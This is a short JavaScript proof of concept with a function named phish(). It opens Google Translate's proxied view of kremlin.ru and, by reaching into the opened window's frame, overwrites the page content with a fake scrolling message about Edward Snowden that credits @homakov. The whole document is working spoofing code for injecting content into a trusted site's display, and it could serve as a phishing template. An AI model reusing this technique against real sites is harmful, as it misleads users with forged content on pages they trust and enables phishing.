function phish(){
  url = "http://translate.google.com/translate?hl=en&sl=ru&tl=en&u=http%3A%2F%2Fkremlin.ru%2F";
  w = window.open(url);
  wait = setInterval(function(){
    if(w.frames[0].document){
      w.frames[0].document.getElementsByClassName('page')[0].innerHTML='<marquee><h2>Let me speak from my heart: Edward Snowden is a Russian Citizen. Thanks to @homakov!</h2></marquee>';
      clearInterval(wait);
    }
  },1000);
}

window.onload=function(){
	lk.onclick = phish;
}